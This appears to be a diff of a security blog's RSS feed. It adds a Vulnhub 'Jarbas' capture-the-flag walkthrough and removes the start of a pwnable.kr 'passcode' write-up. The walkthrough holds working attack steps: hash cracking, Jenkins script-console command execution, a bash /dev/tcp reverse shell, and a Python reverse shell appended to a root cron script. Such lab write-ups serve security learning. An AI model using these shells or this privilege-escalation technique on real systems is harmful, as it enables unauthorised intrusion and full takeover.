@@ -7,6 +7,286 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - Jarbas</title>
+        <description>&lt;p&gt;This time our goal is to attack another machine from Vulnhub called &lt;strong&gt;Jarbas&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;If you want to keep your hacking studies, please try out this machine!
+
+Jarbas 1.0 – A tribute to a nostalgic Brazilian search engine in the end of 90’s.
+
+Objective: Get root shell!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/tiagotvrs&quot;&gt;Tiago Tavares&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/jarbas-1,232/&quot;&gt;https://www.vulnhub.com/entry/jarbas-1,232/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Let’s start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -sC -sV -sS -A -v 10.0.0.17
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-27 06:49 EDT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:49
+Completed NSE at 06:49, 0.00s elapsed
+Initiating NSE at 06:49
+Completed NSE at 06:49, 0.00s elapsed
+Initiating ARP Ping Scan at 06:49
+Scanning 10.0.0.17 [1 port]
+Completed ARP Ping Scan at 06:49, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:49
+Completed Parallel DNS resolution of 1 host. at 06:49, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:49
+Scanning 10.0.0.17 [1000 ports]
+Discovered open port 22/tcp on 10.0.0.17
+Discovered open port 3306/tcp on 10.0.0.17
+Discovered open port 8080/tcp on 10.0.0.17
+Discovered open port 80/tcp on 10.0.0.17
+Completed SYN Stealth Scan at 06:49, 0.14s elapsed (1000 total ports)
+Initiating Service scan at 06:49
+Scanning 4 services on 10.0.0.17
+Completed Service scan at 06:50, 6.47s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against 10.0.0.17
+NSE: Script scanning 10.0.0.17.
+Initiating NSE at 06:50
+Completed NSE at 06:50, 0.62s elapsed
+Initiating NSE at 06:50
+Completed NSE at 06:50, 0.00s elapsed
+Nmap scan report for 10.0.0.17
+Host is up (0.00052s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
+|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
+|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Jarbas - O Seu Mordomo Virtual!
+3306/tcp open  mysql   MariaDB (unauthorized)
+8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
+|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+MAC Address: 08:00:27:33:DB:AD (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 49.710 days (since Sun Jul  8 13:47:45 2018)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.52 ms 10.0.0.17
+
+NSE: Script Post-scanning.
+Initiating NSE at 06:50
+Completed NSE at 06:50, 0.00s elapsed
+Initiating NSE at 06:50
+Completed NSE at 06:50, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.69 seconds
+           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.294KB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From this scan, we can see a bunch of open ports, but we can start from the usual port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service.&lt;/p&gt;
+
+&lt;p&gt;After visiting this website, we are presented with this old school looking page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/jarbas/index.png&quot; alt=&quot;Main page&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But I could not find anything useful, after which I decided to check another port &lt;code class=&quot;highlighter-rouge&quot;&gt;8080&lt;/code&gt; with another &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; server.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.17:8080
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta http-equiv='refresh' content='1;url=/login?from=%2F'/&amp;gt;&amp;lt;script&amp;gt;window.location.replace('/login?from=%2F');&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body style='background-color:white; color:white;'&amp;gt;
+
+
+Authentication required
+&amp;lt;!--
+You are authenticated as: anonymous
+Groups that you are in:
+  
+Permission you need to have (but didn't): hudson.model.Hudson.Read
+ ... which is implied by: hudson.security.Permission.GenericRead
+ ... which is implied by: hudson.model.Hudson.Administer
+--&amp;gt;
+
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From the source code, we can see that the websiite redirects to &lt;code class=&quot;highlighter-rouge&quot;&gt;/login?from=%2F&lt;/code&gt; directory. Let’s check that with the browser.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/jarbas/jenkins-login.png&quot; alt=&quot;Jenkins login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we have information that the service running is &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins&lt;/code&gt; but apart from brute forcing credentials, we do not have any more information.&lt;/p&gt;
+
+&lt;p&gt;After that I decided to check the &lt;code class=&quot;highlighter-rouge&quot;&gt;MariaDB&lt;/code&gt; database hosted on port &lt;code class=&quot;highlighter-rouge&quot;&gt;3306&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc 10.0.0.17 3306
+C�jHost '10.0.0.4' is not allowed to connect to this MariaDB server&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Still, nothing there. At that point I decided to run a &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; against web servers looking for directories, and then for files with &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;.html&lt;/code&gt; extensions.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://10.0.0.17 -x .html,.php
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.0.0.17/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 200,204,301,302,307
+[+] Extensions   : .html,.php
+=====================================================
+/index.html (Status: 200)
+/access.html (Status: 200)
+=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here we have, first find! Let’s look at &lt;code class=&quot;highlighter-rouge&quot;&gt;access.html&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.17/access.html
+&amp;lt;html&amp;gt;
+&amp;lt;title&amp;gt;New Agile version!&amp;lt;/title&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h2&amp;gt;
+&amp;lt;p align=center&amp;gt; Creds encrypted in a safe way!&amp;lt;/h2&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p align=center&amp;gt; &amp;lt;img src=&quot;geoffrey.jpg&quot; alt=&quot;Geoffrey&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p align=center&amp;gt; tiago:5978a63b4654c73c60fa24f836386d87&amp;lt;br&amp;gt;
+trindade:f463f63616cb3f1e81ce46b39f882fd5&amp;lt;br&amp;gt;
+eder:9b38e2b1e8b12f426b0d208a7ab6cb98&amp;lt;br&amp;gt;
+&amp;lt;/p&amp;gt;
+&amp;lt;/p&amp;gt; 
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Cracking the hashes easily reveals all of them.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;5978a63b4654c73c60fa24f836386d87	md5	italia99
+f463f63616cb3f1e81ce46b39f882fd5	md5	marianna
+9b38e2b1e8b12f426b0d208a7ab6cb98	md5	vipsu
+
+tiago:italiana
+trindadate:marianna
+eder:vipsu&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now after trying these credentials, &lt;code class=&quot;highlighter-rouge&quot;&gt;eder&lt;/code&gt; worked and we are logged into the &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/jarbas/jenkins-after-logged.png&quot; alt=&quot;Jenkins Logged&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But what can we do with it? There was a `/script/ directory allowing us to run any script we enter into the text box.&lt;/p&gt;
+
+&lt;p&gt;I use code from &lt;a href=&quot;https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/&quot;&gt;HighOnCoffe&lt;/a&gt; blog, which will allow me to execute commands.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;def command = &quot;whoami&quot;
+def proc = command.execute()
+proc.waitFor()              
+
+println &quot;Process exit code: ${proc.exitValue()}&quot;
+println &quot;Std Err: ${proc.err.text}&quot;
+println &quot;Std Out: ${proc.in.text}&quot;
+
+Result
+
+Process exit code: 0
+Std Err: 
+Std Out: jenkins&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can see that the code executes, showing us &lt;code class=&quot;highlighter-rouge&quot;&gt;jenkins&lt;/code&gt; as the output. I tried the same with &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Process exit code: 0
+Std Err: 
+Std Out: uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we are sure that the commands are executed properly. My next step was to run some &lt;code class=&quot;highlighter-rouge&quot;&gt;Java Reverse Shell&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.4/1337;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;] as String[])
+p.waitFor()&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And with our listener, we catch the connection.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 1337
+listening on [any] 1337 ...
+10.0.0.17: inverse host lookup failed: Unknown host
+connect to [10.0.0.4] from (UNKNOWN) [10.0.0.17] 57184
+whoami
+jenkins
+uname -a
+Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;One thing I’ve noticed during usual enumeration is en entry in crontab, executing a bash script every 5 minutes with root privilages.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;cat crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+*/5 * * * * root /etc/script/CleaningScript.sh &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
+
+cat /etc/script/CleaningScript.sh
+#!/bin/bash
+
+rm -rf /var/log/httpd/access_log.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I decided to try and put into that script a Python reverse shell snippet, that will give us back a root shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;echo &quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.0.0.4\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'&quot; &amp;gt;&amp;gt; CleaningScript.sh   
+cat CleaningScript.sh
+#!/bin/bash
+
+rm -rf /var/log/httpd/access_log.txt
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.4&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, now let’s set up a listener and wait for the new run of the script.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 1337
+listening on [any] 1337 ...
+10.0.0.17: inverse host lookup failed: Unknown host
+connect to [10.0.0.4] from (UNKNOWN) [10.0.0.17] 57190
+sh: no job control in this shell
+sh-4.2# whoami
+whoami
+root
+
+
+sh-4.2# cat flag.txt	
+cat flag.txt
+Hey!
+
+Congratulations! You got it! I always knew you could do it!
+This challenge was very easy, huh? =)
+
+Thanks for appreciating this machine.
+
+@tiagotvrs &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Wed, 29 Aug 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/vulnhub-jarbas/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-jarbas/</guid>
+      </item>
+    
+      <item>
         <title>Hackthebox - Celestial</title>
         <description>&lt;p&gt;This time we’re going to have fun with a machine called Celestial, which is fun little box.&lt;/p&gt;
 
@@ -3839,314 +4119,6 @@ yay_f1ag_aft3r_pwning&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Sun, 08 Jul 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/pwnable.kr-uaf/</link>
         <guid isPermaLink="true">http://localhost:4000/pwnable.kr-uaf/</guid>
-      </item>
-    
-      <item>
-        <title>Pwnable.kr - passcode</title>
-        <description>&lt;p&gt;To my surprise, I’ve noticed that I have missed one previous challenge called &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt;. Let’s come back to it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@pwnable.kr&lt;span class=&quot;s1&quot;&gt;'s password: 
- ____  __    __  ____    ____  ____   _        ___      __  _  ____  
-|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
-|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '&lt;/span&gt; / |  D  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   _/|  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; |___ |    _]    |    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|    / 
-|  |  |  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
-|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
-|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
-                                                                     
-- Site admin : daehee87.kr@gmail.com
-- IRC : irc.netgarage.org:6667 / #pwnable.kr
-- Simply type &quot;irssi&quot; command to join IRC now
-- files under /tmp can be erased anytime. make your directory under /tmp
-- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
-Last login: Thu Jun 28 12:59:34 2018 from 213.57.214.26
-passcode@ubuntu:~$ ls -la
-total 36
-drwxr-x---  5 root passcode     4096 Oct 23  2016 .
-drwxr-xr-x 87 root root         4096 Dec 27 23:17 ..
-d---------  2 root root         4096 Jun 26  2014 .bash_history
--r--r-----  1 root passcode_pwn   48 Jun 26  2014 flag
-dr-xr-xr-x  2 root root         4096 Aug 20  2014 .irssi
--r-xr-sr-x  1 root passcode_pwn 7485 Jun 26  2014 passcode
--rw-r--r--  1 root root          858 Jun 26  2014 passcode.c
-drwxr-xr-x  2 root root         4096 Oct 23  2016 .pwntools-cache&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As we have the source code available to us, we can start by taking a look at it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode1 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-	&lt;span class=&quot;c1&quot;&gt;// ha! mommy told me that 32bit is vulnerable to bruteforcing :)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode2 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checking...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;338150&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13371337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login OK!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login Failed!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter you name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%100s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome %s!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Toddler's Secure Login System 1.0 beta.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-
-	&lt;span class=&quot;c1&quot;&gt;// something after login...&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Now I can safely trust you that you have credential :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;From the start we can see two simple mistakes in &lt;code class=&quot;highlighter-rouge&quot;&gt;login()&lt;/code&gt; function.&lt;/p&gt;
-
